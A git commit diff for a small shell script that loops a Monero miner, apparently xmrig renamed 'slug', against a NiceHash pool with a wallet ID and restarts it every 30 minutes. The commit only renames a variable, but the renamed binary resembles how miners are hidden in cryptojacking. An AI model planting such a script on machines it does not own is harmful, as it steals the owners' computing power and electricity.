5e9567af4951e8fb97674b953077489d440cb236
SnowR4in <92912334+SnowR4in@users.noreply.github.com>
2024-07-15 16:44:32 +0600

    Update b.sh

--- b.sh
+++ b.sh
@@ -2,8 +2,8 @@
 
 while true; do
     ./slug -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u NHbLt4t5HiuQaT4qrLCBnoEUeKH1aG44eGdG.slug -p x &
-    xmrig_pid=$!
+    slug_pid=$!
     sleep 1800
-    kill $xmrig_pid
-    wait $xmrig_pid 2>/dev/null
+    kill $slug_pid
+    wait $slug_pid 2>/dev/null
 done
